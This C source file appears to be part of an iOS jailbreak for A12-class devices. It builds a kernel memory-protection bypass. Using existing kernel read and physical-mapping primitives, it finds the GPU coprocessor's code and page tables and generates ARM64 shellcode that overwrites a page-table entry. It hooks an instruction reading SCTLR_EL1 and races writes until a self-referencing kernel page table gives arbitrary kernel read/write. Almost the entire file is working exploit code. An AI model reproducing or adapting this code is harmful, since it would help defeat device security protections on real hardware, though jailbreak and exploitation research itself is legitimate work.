#include <libjailbreak/primitives.h>
#include "momentarius.h"
#include "utils.h"

static void *wait_for_pte(void *data) {
    uint32_t counter = 0;
    usleep(1000);
    
    uint32_t expected_val = (momentarius.gfx.method == 1) ? 0xd5381008 : 0xd538101d;
    while (1) {
        if (counter > 1000 && kread64(momentarius.target_kern_addr) == momentarius.target_pte) {
            while(*(volatile uint32_t *)data != expected_val) {
                *(volatile uint32_t *)data = expected_val;
                asm volatile ("dsb sy");
            }
            
            stop_write = true;
            break;
        }
        
        usleep(1000);
        if (++counter == 1000) {
            gfx_suspend();
            gfx_resume();
        }
    }
    return NULL;
}

static int gfx_gen_shellcode(uint64_t pte_offset) {
    if ((momentarius.gfx.shc_data = calloc(1, 0x40)) == NULL) return -1;
    if ((momentarius.gfx.hook_data = calloc(1, 0x20)) == NULL) return -1;
    
    uint16_t target_lo = (0xC000 + pte_offset) & 0xFFFF; // 0x1FFC000 + pte_offset
    if(momentarius.gfx.method == 1) {
        /* 0x00 */ momentarius.gfx.shc_data[0] = 0xd2a03fe9; // mov x9, 0x1FF0000
        /* 0x04 */ momentarius.gfx.shc_data[1] = a64_gen_movk(9, target_lo, 0); // movk x9, target_lo
        /* 0x08 */ momentarius.gfx.shc_data[2] = a64_gen_movz(8, momentarius.target_pte & 0xffff, 0); // these next 4 are the target PTE
        /* 0x0C */ momentarius.gfx.shc_data[3] = a64_gen_movk(8, (momentarius.target_pte >> 16) & 0xffff, 16);
        /* 0x10 */ momentarius.gfx.shc_data[4] = a64_gen_movk(8, (momentarius.target_pte >> 32) & 0xffff, 32);
        /* 0x14 */ momentarius.gfx.shc_data[5] = a64_gen_movk(8, (momentarius.target_pte >> 48) & 0xffff, 48);
        /* 0x18 */ momentarius.gfx.shc_data[6] = 0xF9000128; // str x8, [x9]
        /* 0x1C */ momentarius.gfx.shc_data[7] = 0xd5381008; // mrs x8, SCTLR_EL1
    } else {
        /* 0x00 */ momentarius.gfx.shc_data[0] = 0xd2a03ffe; // mov x30, 0x1FF0000
        /* 0x04 */ momentarius.gfx.shc_data[1] = a64_gen_movk(30, target_lo, 0); // movk x30, target_lo
        /* 0x08 */ momentarius.gfx.shc_data[2] = a64_gen_movz(29, momentarius.target_pte & 0xffff, 0); // these next 4 are the target PTE
        /* 0x0C */ momentarius.gfx.shc_data[3] = a64_gen_movk(29, (momentarius.target_pte >> 16) & 0xffff, 16);
        /* 0x10 */ momentarius.gfx.shc_data[4] = a64_gen_movk(29, (momentarius.target_pte >> 32) & 0xffff, 32);
        /* 0x14 */ momentarius.gfx.shc_data[5] = a64_gen_movk(29, (momentarius.target_pte >> 48) & 0xffff, 48);
        /* 0x18 */ momentarius.gfx.shc_data[6] = 0xf90003dd; // str x29, [x30]
        /* 0x1C */ momentarius.gfx.shc_data[7] = 0xd538101d; // mrs x29, SCTLR_EL1
    }
    /* 0x20 */ momentarius.gfx.shc_data[8] = a64_gen_branch(momentarius.gfx.shc_offset + 0x20, momentarius.gfx.hook_offset + 0x4);
    
    /* 0x00 */ momentarius.gfx.hook_data[0] = a64_gen_branch(momentarius.gfx.hook_offset, momentarius.gfx.shc_offset);
    return 0;
}

static int gfx_run_patchfinder(void) {
    uint64_t second_page = map_phys_data(momentarius.gfx.text_pa + 0x4000, 0x4000);
    debug_log("second_page: 0x%llx\n", second_page);
    
    const char *uuid = "uuid";
    uint8_t* res = memmem((void *)second_page, 0x4000, uuid, strlen(uuid));
    if (res == NULL) return -1;
    
    uint32_t* gfx_data_ptr = (uint32_t*)(res + 0x38); // always at +0x38
    momentarius.gfx.data_pa = ((uint64_t)gfx_data_ptr[1] << 32) | gfx_data_ptr[0];
    if(!GFX_PA_VALID(momentarius.gfx.data_pa)) return -1;
    debug_log("gfx_data_pa: %#llx\n", momentarius.gfx.data_pa);
    
    uint64_t target_gfx_pte = (momentarius.gfx.text_pa + 0x4000)| 0x483;
    debug_log("target_gfx_pte: %#llx\n", target_gfx_pte);
    for (int i = 0; i < 20; i++) { // 20 pages
        uint64_t curr_gfx_pa = momentarius.gfx.data_pa + (i * 0x4000);
        uint64_t current_page = map_phys_data(curr_gfx_pa, 0x4000);
        uint64_t attempted_l3 = *(uint64_t *)(current_page + 0x8);
        if(attempted_l3 == target_gfx_pte) {
            momentarius.gfx.target_l3_table = curr_gfx_pa; // get L3 table which maps text
            break;
        }
    }
    
    if (momentarius.gfx.target_l3_table == 0) return -1;
    debug_log("target_l3_table: %#llx\n", momentarius.gfx.target_l3_table);
    
    uint32_t sctlr_el1_x8 = 0xd5381008;
    uint32_t sctlr_el1_x29 = 0xd538101d;
    uint64_t region = second_page;
    
    for (uint64_t i = 0; i < 0x4000; i+=0x4) {
        if (*(volatile uint32_t *)(region + i) == sctlr_el1_x8) {
            momentarius.gfx.hook_offset = (uint32_t)i + 0x4000;
            momentarius.gfx.method = 1;
            break;
        }
        if (*(volatile uint32_t *)(region + i) == sctlr_el1_x29) {
            momentarius.gfx.hook_offset = (uint32_t)i + 0x4000;
            momentarius.gfx.method = 2;
            break;
        }
    }
    
    debug_log("hook_offset: 0x%x\n", momentarius.gfx.hook_offset);
    if (momentarius.gfx.hook_offset == 0) return -1;
    momentarius.gfx.shc_offset = 0x2000; // seems like 0x2000 is always usable
    debug_log("shc_offset: 0x%x\n", momentarius.gfx.shc_offset);
    return 0;
}

int momentarius_init_A12(void) {
    uint64_t gfx_text_base = map_phys_data(momentarius.gfx.text_pa, 0x4000);
    if (gfx_text_base == 0) return -1;
    debug_log("gfx_text_base: 0x%llx\n", gfx_text_base);
    
    if (gfx_run_patchfinder() != 0) return -1;
    uint64_t shc_page = map_writeback_page(momentarius.gfx.text_pa + momentarius.gfx.shc_offset);
    debug_log("shc_page: 0x%llx\n", shc_page);
    
    uint64_t target_l3_table = map_writeback_page(momentarius.gfx.target_l3_table);
    debug_log("target_l3_table: 0x%llx\n", momentarius.gfx.target_l3_table);
    
    uint64_t hook_page = map_writeback_page(momentarius.gfx.text_pa + momentarius.gfx.hook_offset);
    debug_log("hook_page: 0x%llx\n", hook_page);
    if (shc_page == 0 || target_l3_table == 0 || hook_page == 0) return -1;
    
    uint64_t shc_input = (uint64_t)momentarius.gfx.shc_data;
    uint64_t shc_output = shc_page + (momentarius.gfx.shc_offset & 0x3fff);
    debug_log("shc_input: 0x%llx\n", shc_input);
    debug_log("shc_output: 0x%llx\n", shc_output);
    
    uint64_t hook_input = (uint64_t)momentarius.gfx.hook_data;
    uint64_t hook_offset = momentarius.gfx.hook_offset & 0x3fff;
    debug_log("hook_input: 0x%llx\n", hook_input);
    debug_log("hook_offset: 0x%llx\n", hook_offset);
    
    // selfrefpte
    if ((momentarius.self_ref_pt_kva = kalloc_page()) == 0) return -1;
    debug_log("self_ref_pt_kva: 0x%llx\n", momentarius.self_ref_pt_kva);
    
    if ((momentarius.target_rw_mapping = kalloc_page()) == 0) return -1;
    debug_log("target_rw_mapping: 0x%llx\n", momentarius.target_rw_mapping);
    
    // find L3 pte for self_ref_pt_kva
    uint64_t l3_table_pte = 0;
    uint64_t level = 3;
    vtophys_lvl(momentarius.kern_ttep, momentarius.self_ref_pt_kva, &level, &l3_table_pte);
    if (l3_table_pte == 0) return -1;
    debug_log("l3_table_pte: 0x%llx\n", l3_table_pte);
    
    // va of L3 table pte of self_ref_pt_kva
    uint64_t l3_table_pte_kva = phystokv(l3_table_pte);
    if (!KADDR_VALID(l3_table_pte_kva)) return -1;
    debug_log("l3_table_pte_kva: 0x%llx\n", l3_table_pte_kva);
    
    // L3 table pa of self_ref_pt_kva
    uint64_t l3_table_pte_pa = kvtophys(l3_table_pte_kva & ~0x3FFF);
    if (l3_table_pte_pa == 0) return -1;
    debug_log("l3_table_pte_pa: 0x%llx\n", l3_table_pte_pa);
    
    // original pte which maps self_ref_pt_kva
    uint64_t l3_table_mapping_pte = kread64(l3_table_pte_kva);
    if (l3_table_mapping_pte == 0) return -1;
    debug_log("l3_table_mapping_pte: 0x%llx\n", l3_table_mapping_pte);
    
    // L3 pte for target_rw_mapping
    level = 3;
    uint64_t mapping_pte = 0;
    vtophys_lvl(momentarius.kern_ttep, momentarius.target_rw_mapping, &level, &mapping_pte);
    if (mapping_pte == 0) return -1;
    debug_log("mapping_pte: 0x%llx\n", mapping_pte);
    
    uint64_t target_l3_table_pa = kvtophys(phystokv(mapping_pte) & ~0x3FFF);
    if (target_l3_table_pa == 0) return -1;
    debug_log("target_l3_table_pa: 0x%llx\n", target_l3_table_pa);
    
    // change pte pa to point to target_rw_mapping L3
    momentarius.target_pte = (l3_table_mapping_pte & 0xFFFF000000003FFFLL) | target_l3_table_pa;
    debug_log("target_pte: 0x%llx\n", momentarius.target_pte);
    
    // va of self_ref_pt PTE
    momentarius.target_kern_addr = l3_table_pte_kva;
    debug_log("target_kern_addr: 0x%llx\n", momentarius.target_kern_addr);
    
    uint64_t pte_offset = l3_table_pte_kva & 0x3FFF;
    debug_log("pte_offset: 0x%llx\n", pte_offset);
    
    if (gfx_gen_shellcode(pte_offset) != 0) return -1;
    pthread_t wait_thread = NULL;
    pthread_create(&wait_thread, NULL, wait_for_pte, (void *)(hook_page + hook_offset));
    
    while (1) {
        if (stop_write) break;
        *(volatile uint64_t*)(target_l3_table)                         = momentarius.gfx.text_pa | 0x403;  // map 0x0
        *(volatile uint64_t*)(target_l3_table + 0x3FF8)                = l3_table_pte_pa | 0x403;  // map magic page L3 to last ttbr0 VA 0x1FFC000
        *(volatile uint64_t*)(shc_page + momentarius.gfx.shc_offset)          = *(uint64_t*)&momentarius.gfx.shc_data[0];
        *(volatile uint64_t*)(shc_page + momentarius.gfx.shc_offset + 0x8)    = *(uint64_t*)&momentarius.gfx.shc_data[2];
        *(volatile uint64_t*)(shc_page + momentarius.gfx.shc_offset + 0x10)   = *(uint64_t*)&momentarius.gfx.shc_data[4];
        *(volatile uint64_t*)(shc_page + momentarius.gfx.shc_offset + 0x18)   = *(uint64_t*)&momentarius.gfx.shc_data[6];
        *(volatile uint64_t*)(shc_page + momentarius.gfx.shc_offset + 0x20)   = *(uint64_t*)&momentarius.gfx.shc_data[8];
        *(volatile uint32_t*)(hook_page + hook_offset)                 = momentarius.gfx.hook_data[0];
    }
    
    momentarius.target_rw_pte = momentarius.self_ref_pt_kva + ((momentarius.target_rw_mapping >> 11) & 0x3FF8);
    momentarius.orig_pte = kread64(momentarius.target_rw_pte);
    debug_log("target_rw_pte: 0x%llx\n", momentarius.target_rw_pte);
    debug_log("orig_pte: 0x%llx\n", momentarius.orig_pte);
    return 0;
}
